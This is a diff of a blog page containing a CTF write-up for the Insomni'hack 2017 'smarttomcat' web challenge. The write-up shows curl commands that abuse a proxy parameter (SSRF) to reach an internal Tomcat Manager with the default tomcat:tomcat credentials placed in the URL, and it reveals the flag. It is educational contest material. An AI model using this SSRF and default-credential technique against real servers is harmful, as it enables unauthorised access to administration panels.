@@ -8,7 +8,9 @@
     
         <meta name="keywords" content="security,web,writeups,ctf" />
     
-    <meta name="description" content="InformationsVersion
+    <meta name="description" content="Informations
+Version
+
 
 
 By
@@ -25,19 +27,21 @@ Creation
 
 
 CTF
-Name : Insomni’hack teaser 2017
+
+Name : Insomni&apos;hack teaser 2017
 Website : teaser.insomnihack.ch
 Type : Online
 Format : Jeopardy
 CTF Time : link
 
-Description
-smar">
+Description">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Insomni'hack teaser - 50 - smarttomcat - Web">
 <meta property="og:url" content="http://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/index.html">
 <meta property="og:site_name" content="RawSec">
-<meta property="og:description" content="InformationsVersion
+<meta property="og:description" content="Informations
+Version
+
 
 
 By
@@ -54,19 +58,21 @@ Creation
 
 
 CTF
-Name : Insomni’hack teaser 2017
+
+Name : Insomni&apos;hack teaser 2017
 Website : teaser.insomnihack.ch
 Type : Online
 Format : Jeopardy
 CTF Time : link
 
-Description
-smar">
+Description">
 <meta property="og:image" content="http://rawsec.ml/images/ctf.png">
 <meta property="og:updated_time" content="2017-02-07T18:23:36.685Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Insomni'hack teaser - 50 - smarttomcat - Web">
-<meta name="twitter:description" content="InformationsVersion
+<meta name="twitter:description" content="Informations
+Version
+
 
 
 By
@@ -83,14 +89,14 @@ Creation
 
 
 CTF
-Name : Insomni’hack teaser 2017
+
+Name : Insomni&apos;hack teaser 2017
 Website : teaser.insomnihack.ch
 Type : Online
 Format : Jeopardy
 CTF Time : link
 
-Description
-smar">
+Description">
 <meta name="twitter:image" content="http://rawsec.ml/images/ctf.png">
     
 
@@ -250,7 +256,9 @@ ga('send', 'pageview');
         
         
         <div class="article-entry" itemprop="articleBody">
-            <h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+            <h2>Informations</h2>
+<h3>Version</h3>
+<table>
 <thead>
 <tr>
 <th>By</th>
@@ -266,23 +274,28 @@ ga('send', 'pageview');
 </tr>
 </tbody>
 </table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : Insomni’hack teaser 2017</li>
+<h3>CTF</h3>
+<ul>
+<li><strong>Name</strong> : Insomni'hack teaser 2017</li>
 <li><strong>Website</strong> : <a href="http://teaser.insomnihack.ch/" target="_blank" rel="external">teaser.insomnihack.ch</a></li>
 <li><strong>Type</strong> : Online</li>
 <li><strong>Format</strong> : Jeopardy</li>
 <li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/382" target="_blank" rel="external">link</a></li>
 </ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<h3>Description</h3>
+<blockquote>
 <p>smarttomcat - Web - 50 pts - realized by xel/grimmlin</p>
-<p>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot<br>Now the damn thing has attacked me and flew away. I can’t even seem to track it down on the broken search interface… Can you help me ?</p>
+<p>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot
+Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me ?</p>
 <p><a href="http://smarttomcat.teaser.insomnihack.ch/" target="_blank" rel="external">Search interface</a></p>
 </blockquote>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We have a web application like this:</p>
+<h2>Solution</h2>
+<p>We have a web application like this:</p>
 <p><img src="http://i.imgur.com/ey5DMYM.png" alt=""></p>
-<p>Let’s take a look at sources, there is some JavaScript:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> OpenLayers.Map(<span class="string">"map"</span>);</div><div class="line">map.addLayer(<span class="keyword">new</span> OpenLayers.Layer.OSM());</div><div class="line"><span class="keyword">var</span> lonlat = <span class="keyword">new</span> OpenLayers.LonLat(<span class="number">15.2833</span>,<span class="number">-4.2667</span>).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line"><span class="keyword">var</span> zoom = <span class="number">10</span>;</div><div class="line"><span class="keyword">var</span> markers = <span class="keyword">new</span> OpenLayers.Layer.Markers( <span class="string">"Markers"</span> );</div><div class="line">map.addLayer(markers);</div><div class="line"><span class="keyword">var</span> center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">markers.addMarker(center_marker);</div><div class="line">map.setCenter(lonlat,zoom);</div><div class="line"><span class="keyword">var</span> request;</div><div class="line">$(<span class="string">'#findcatbycoord'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    event.preventDefault();</div><div class="line">    <span class="keyword">if</span> (request) &#123;</div><div class="line">        request.abort();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> cat_coords = <span class="string">'http://localhost:8080/index.jsp?x='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val()) + <span class="string">'&amp;y='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">    <span class="keyword">var</span> $form = $(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">var</span> $inputs = $form.find(<span class="string">'input, select, button, textarea'</span>);</div><div class="line">    $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">true</span>);</div><div class="line"></div><div class="line">    request = $.ajax(&#123;</div><div class="line">        url: <span class="string">'/index.php'</span>,</div><div class="line">        type: <span class="string">'post'</span>,</div><div class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">          markers.clearMarkers();</div><div class="line">          <span class="keyword">while</span>(map.popups.length) &#123;map.removePopup(map.popups[<span class="number">0</span>]);&#125;</div><div class="line">          <span class="keyword">var</span> y = <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">          <span class="keyword">var</span> x = <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val());</div><div class="line">          <span class="keyword">if</span> (<span class="built_in">isNaN</span>(y) || <span class="built_in">isNaN</span>(x)) &#123;y = <span class="number">15.2833</span>; x = <span class="number">-4.2667</span>;&#125;</div><div class="line">          lonlat = <span class="keyword">new</span> OpenLayers.LonLat(y,x).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line">          center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">          markers.addMarker(center_marker);</div><div class="line">          popup = <span class="keyword">new</span> OpenLayers.Popup.FramedCloud(<span class="string">"popup"</span>,</div><div class="line">                   lonlat,</div><div class="line">                   <span class="literal">null</span>,</div><div class="line">                   data, <span class="literal">null</span>,</div><div class="line">                   <span class="literal">true</span>);</div><div class="line">          map.addPopup(popup);</div><div class="line">          map.setCenter(lonlat,zoom);</div><div class="line">        &#125;,</div><div class="line">        data: &#123;</div><div class="line">		u: cat_coords</div><div class="line">	&#125;</div><div class="line">    &#125;);</div><div class="line">    request.always(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">       $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">false</span>);</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">&#125;);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">[...]</div></pre></td></tr></table></figure>
-<p>The interesting line is:<br><code>var cat_coords = &#39;http://localhost:8080/index.jsp?x=&#39; + parseFloat($(&#39;#xcoord&#39;).val()) + &#39;&amp;y=&#39; + parseFloat($(&#39;#ycoord&#39;).val());</code>. So we have one web serve that is a proxy for a web application.</p>
+<p>Let's take a look at sources, there is some JavaScript:</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line">&lt;script&gt;</div><div class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> OpenLayers.Map(<span class="string">"map"</span>);</div><div class="line">map.addLayer(<span class="keyword">new</span> OpenLayers.Layer.OSM());</div><div class="line"><span class="keyword">var</span> lonlat = <span class="keyword">new</span> OpenLayers.LonLat(<span class="number">15.2833</span>,<span class="number">-4.2667</span>).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line"><span class="keyword">var</span> zoom = <span class="number">10</span>;</div><div class="line"><span class="keyword">var</span> markers = <span class="keyword">new</span> OpenLayers.Layer.Markers( <span class="string">"Markers"</span> );</div><div class="line">map.addLayer(markers);</div><div class="line"><span class="keyword">var</span> center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">markers.addMarker(center_marker);</div><div class="line">map.setCenter(lonlat,zoom);</div><div class="line"><span class="keyword">var</span> request;</div><div class="line">$(<span class="string">'#findcatbycoord'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</div><div class="line">    event.preventDefault();</div><div class="line">    <span class="keyword">if</span> (request) &#123;</div><div class="line">        request.abort();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> cat_coords = <span class="string">'http://localhost:8080/index.jsp?x='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val()) + <span class="string">'&amp;y='</span> + <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">    <span class="keyword">var</span> $form = $(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">var</span> $inputs = $form.find(<span class="string">'input, select, button, textarea'</span>);</div><div class="line">    $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">true</span>);</div><div class="line"></div><div class="line">    request = $.ajax(&#123;</div><div class="line">        url: <span class="string">'/index.php'</span>,</div><div class="line">        type: <span class="string">'post'</span>,</div><div class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">          markers.clearMarkers();</div><div class="line">          <span class="keyword">while</span>(map.popups.length) &#123;map.removePopup(map.popups[<span class="number">0</span>]);&#125;</div><div class="line">          <span class="keyword">var</span> y = <span class="built_in">parseFloat</span>($(<span class="string">'#ycoord'</span>).val());</div><div class="line">          <span class="keyword">var</span> x = <span class="built_in">parseFloat</span>($(<span class="string">'#xcoord'</span>).val());</div><div class="line">          <span class="keyword">if</span> (<span class="built_in">isNaN</span>(y) || <span class="built_in">isNaN</span>(x)) &#123;y = <span class="number">15.2833</span>; x = <span class="number">-4.2667</span>;&#125;</div><div class="line">          lonlat = <span class="keyword">new</span> OpenLayers.LonLat(y,x).transform(<span class="keyword">new</span> OpenLayers.Projection(<span class="string">"EPSG:4326"</span>),map.getProjectionObject());</div><div class="line">          center_marker = <span class="keyword">new</span> OpenLayers.Marker(lonlat);</div><div class="line">          markers.addMarker(center_marker);</div><div class="line">          popup = <span class="keyword">new</span> OpenLayers.Popup.FramedCloud(<span class="string">"popup"</span>,</div><div class="line">                   lonlat,</div><div class="line">                   <span class="literal">null</span>,</div><div class="line">                   data, <span class="literal">null</span>,</div><div class="line">                   <span class="literal">true</span>);</div><div class="line">          map.addPopup(popup);</div><div class="line">          map.setCenter(lonlat,zoom);</div><div class="line">        &#125;,</div><div class="line">        data: &#123;</div><div class="line">		u: cat_coords</div><div class="line">	&#125;</div><div class="line">    &#125;);</div><div class="line">    request.always(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">       $inputs.prop(<span class="string">'disabled'</span>, <span class="literal">false</span>);</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">&#125;);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
+<p>The interesting line is:
+<code>var cat_coords = 'http://localhost:8080/index.jsp?x=' + parseFloat($('#xcoord').val()) + '&amp;y=' + parseFloat($('#ycoord').val());</code>. So we have one web serve that is a proxy for a web application.</p>
 <p>We can see in http headers that the front-end server is <code>Apache/2.4.18 (Ubuntu)</code>.</p>
 <p>The description is suggesting we have a Tomcat web app.</p>
 <p>In the javascript we can see <code>var map = new OpenLayers.Map(&quot;map&quot;);</code> and <code>OpenLayers</code> is a class of GeoServer.</p>
@@ -292,26 +305,27 @@ ga('send', 'pageview');
 <li>Back-end: <code>Apache Tomcat/7.0.68 (Ubuntu)</code></li>
 <li>Map-core: <code>GeoServer</code></li>
 </ul>
-<p>In the javascript we also see <code>if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;}</code> that means the browser won’t let us send anything else than numbers in the form. We should use Hackbar or curl.</p>
-<p>What to do now? We guessed this is a Tomcat web app so let’s find the Tomcat Manager (administration panel for Tomcat web server).</p>
+<p>In the javascript we also see <code>if (isNaN(y) || isNaN(x)) {y = 15.2833; x = -4.2667;}</code> that means the browser won't let us send anything else than numbers in the form. We should use Hackbar or curl.</p>
+<p>What to do now? We guessed this is a Tomcat web app so let's find the Tomcat Manager (administration panel for Tomcat web server).</p>
 <p>A normal request (POST data) would be:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">u=http://localhost:8080/index.jsp?x=42%26y=1337</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">u=http://localhost:8080/index.jsp?x=42%26y=1337</div></pre></td></tr></table></figure></p>
 <p>With curl:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://localhost:8080/index.jsp?x=42%26y=1337&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">Tomcat not found ! Try again</div></pre></td></tr></table></figure>
-<p>Now let’s try to reach the Tomcat Manager page which is usually: <code>http://example.org:8180/manager/html</code>. Here we have the manager also running on port <code>8080</code>.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://localhost:8080/index.jsp?x=42%26y=1337&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">Tomcat not found ! Try again</div></pre></td></tr></table></figure></p>
+<p>Now let's try to reach the Tomcat Manager page which is usually: <code>http://example.org:8180/manager/html</code>. Here we have the manager also running on port <code>8080</code>.</p>
 <p>So with curl:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/7.0.68 (Ubuntu) - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 401 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Status report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;This request requires HTTP authentication.&lt;/u&gt;&lt;/p&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;h3&gt;Apache Tomcat/7.0.68 (Ubuntu)&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;%</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&amp; curl --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Apache Tomcat/7.0.68 (Ubuntu) - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 401 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Status report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;This request requires HTTP authentication.&lt;/u&gt;&lt;/p&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;h3&gt;Apache Tomcat/7.0.68 (Ubuntu)&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;%</div></pre></td></tr></table></figure></p>
 <p>With hackbar:</p>
 <p><img src="http://i.imgur.com/q3IC28Y.png" alt=""></p>
-<p>We can see the following error: <code>HTTP Status 401: This request requires HTTP authentication.</code><br>This is because we should provide some Basic Auth informations.</p>
+<p>We can see the following error: <code>HTTP Status 401: This request requires HTTP authentication.</code>
+This is because we should provide some Basic Auth informations.</p>
 <p>Default credentials of Tomcat Manager are <code>tomcat:tomcat</code>.</p>
 <p>So the http header for authentification should be <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>.</p>
-<p>The option to pass basic authentification to curl is <code>-u</code> but doing the following command won’t work:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl -u tomcat:tomcat --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div></pre></td></tr></table></figure>
+<p>The option to pass basic authentification to curl is <code>-u</code> but doing the following command won't work:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ curl -u tomcat:tomcat --data &quot;u=http://127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div></pre></td></tr></table></figure></p>
 <p>Because this will provide the authentification to the Apache front-end instead of giving it to the proxyfied Tomcat Manager running on the back-end.</p>
-<p>But it’s possible to directly provide credentials for basic autentification in the URL, for example: <code>http://user:pass@example.org</code>.</p>
-<p>Let’s do it:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --data &quot;u=http://tomcat:tomcat@127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">We won&apos;t give you the manager, but you can have the flag : INS&#123;th1s_is_re4l_w0rld_pent3st&#125;</div></pre></td></tr></table></figure>
+<p>But it's possible to directly provide credentials for basic autentification in the URL, for example: <code>http://user:pass@example.org</code>.</p>
+<p>Let's do it:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl --data &quot;u=http://tomcat:tomcat@127.0.0.1:8080/manager/html/&quot; http://smarttomcat.teaser.insomnihack.ch/</div><div class="line">We won&apos;t give you the manager, but you can have the flag : INS&#123;th1s_is_re4l_w0rld_pent3st&#125;</div></pre></td></tr></table></figure></p>
 <p>The flag was: <code>INS{th1s_is_re4l_w0rld_pent3st}</code>. No need to find the coordinates.</p>
 
         </div>
@@ -320,7 +334,7 @@ ga('send', 'pageview');
 
 
 
-    <a data-url="http://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/" data-id="cizepeohn00ud2rfsr0y532cr" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+    <a data-url="http://rawsec.ml/en/Insomnihack-2017-Teaser-smarttomcat/" data-id="cizoihhi400vbmefstgz2jyd7" class="article-share-link"><i class="fa fa-share"></i>Share</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -456,20 +470,20 @@ ga('send', 'pageview');
         
 <nav id="article-nav">
     
-        <a href="/en/Insomnihack-2017-Teaser-cryptoquizz/" id="article-nav-newer" class="article-nav-link-wrap">
+        <a href="/en/BITSCTF-2017-writeups/" id="article-nav-newer" class="article-nav-link-wrap">
         <strong class="article-nav-caption">newer</strong>
         <p class="article-nav-title">
         
-            Insomni&#39;hack teaser - 50 - cryptoquizz - Misc
+            BITSCTF 2017 - Write-ups
         
         </p>
         <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
     </a>
     
     
-        <a href="/en/opensuse-install-rtorrent-rutorrent/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/en/Insomnihack-2017-Teaser-cryptoquizz/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">older</strong>
-        <p class="article-nav-title">OpenSUSE : Install rTorrent and ruTorrent</p>
+        <p class="article-nav-title">Insomni&#39;hack teaser - 50 - cryptoquizz - Misc</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -508,26 +522,6 @@ ga('send', 'pageview');
                     <li>
                         
                         <div class="item-thumbnail">
-                            <a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="thumbnail">
-    
-    
-        <span style="background-image:url(/images/ctf.png)" alt="WhiteHat Challenge 01 - 20 - For001 - Forensics" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
-                            <p class="item-title"><a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="title">WhiteHat Challenge 01 - 20 - For001 - Forensics</a></p>
-                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
                             <a href="/en/NeverLAN-CTF-2017-write-ups/" class="thumbnail">
     
     
@@ -541,6 +535,26 @@ ga('send', 'pageview');
                         <div class="item-inner">
                             <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
                             <p class="item-title"><a href="/en/NeverLAN-CTF-2017-write-ups/" class="title">NeverLAN CTF 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="WhiteHat Challenge 01 - 20 - For001 - Forensics" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="title">WhiteHat Challenge 01 - 20 - For001 - Forensics</a></p>
                             <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
                         </div>
                     </li>
